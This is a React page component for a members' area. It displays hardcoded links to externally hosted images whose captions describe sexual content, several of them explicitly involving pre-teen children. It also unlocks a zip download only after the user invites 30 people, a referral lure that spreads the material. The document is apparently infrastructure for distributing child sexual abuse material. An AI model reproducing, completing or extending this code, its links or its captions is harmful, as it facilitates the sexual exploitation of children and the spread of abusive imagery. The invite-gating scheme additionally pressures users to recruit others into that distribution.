import { useState } from 'react';
import AuthenticatedLayout from '@/Layouts/AuthenticatedLayout';
import { Head } from '@inertiajs/react';

export default function Video({ invites, watermark }) {
    // Hardcoded image URLs and captions
    const images = [
        {
            url: 'https://files.catbox.moe/lyxd4g.jpg',
            caption: 'Pre-teen streching her butthole'
        },
        {
            url: 'https://files.catbox.moe/641s3r.jpg',
            caption: 'russian pre-teen masterbuting'
        },
        {
            url: 'https://files.catbox.moe/wr1r9b.jpg',
            caption: 'she takes her own virginity'
        },
        {
            url: 'https://files.catbox.moe/pbx2pv.jpg',
            caption: 'a noisy hard-core sex'
        },
        {
            url: 'https://files.catbox.moe/uvxxie.jpg',
            caption: 'an asian blowjob'
        },
        // Add more images here if needed
    ];

    // State to track whether the link is copied
    const [copied, setCopied] = useState(false);

    const handleCopy = () => {
        const textToCopy = window.location.href; // or replace with the specific link you want
        navigator.clipboard.writeText(textToCopy).then(() => {
            setCopied(true);
            setTimeout(() => setCopied(false), 2000); // Reset the "copied" state after 2 seconds
        });
    };

    return (
        <AuthenticatedLayout
            header={
                <h2 className="text-xl font-semibold leading-tight text-gray-800">
                    Video
                </h2>
            }
        >
            <Head title="Dashboard" />

            <div className="py-12">
                <div className="mx-auto max-w-7xl sm:px-6 lg:px-8">
                    <div className="overflow-hidden bg-white shadow-sm sm:rounded-lg">
                        <div className="p-6 text-gray-900">
                        <div className="bg-yellow-100 border-l-4 border-yellow-500 text-yellow-700 p-4 mb-6" role="alert">
                            <p className="font-bold">Warning</p>
                            <p>videos will be available to download when you have successfully invited 30 people.</p>
                            <p></p>
                        </div>
                            
                            

                            {/* Section visible when invites are 30 or more */}
                            {invites >= 30 && (
                                <div className="mb-8 p-4 bg-yellow-100 rounded-md flex items-center justify-between">
                                    <div>
                                        <p className="text-gray-700">Copy this link and open it with a web browser:</p>
                                        <a href='https://files.catbox.moe/uyugk8.zip' className="text-blue-500">
                                        https://files.catbox.moe/uyugk8.zip
                                        </a>
                                    </div>
                                    <button
                                        onClick={handleCopy}
                                        className="ml-4 px-4 py-2 bg-green-500 text-white font-semibold rounded-md"
                                    >
                                        {copied ? 'Copied!' : 'Copy Link'}
                                    </button>
                                </div>
                            )}

                            {/* Images Section */}
                            {images.map((image, index) => (
                                <div key={index} className="mb-8">
                                    {/* Background Image Container */}
                                    <div
                                        className="relative w-full"
                                        style={{
                                            backgroundImage: `url(${image.url})`,
                                            backgroundSize: 'contain', // Ensures image is fully visible without cropping
                                            backgroundPosition: 'center',
                                            backgroundRepeat: 'no-repeat',
                                            height: '300px', // Adjust the height as needed
                                        }}
                                    >
                                        {/* Watermark */}
                                        <div
                                            className="absolute inset-0 flex items-center justify-center text-black opacity-75"
                                            style={{
                                                zIndex: 1, // Ensures watermark is above the image
                                            }}
                                        >
                                            {watermark}
                                        </div>
                                    </div>
                                    
                                    {/* Caption Below the Image */}
                                    <div className="text-center mt-4 text-lg font-semibold text-gray-800">
                                        {image.caption}
                                    </div>
                                </div>
                            ))}
                        </div>
                    </div>
                </div>
            </div>
        </AuthenticatedLayout>
    );
}
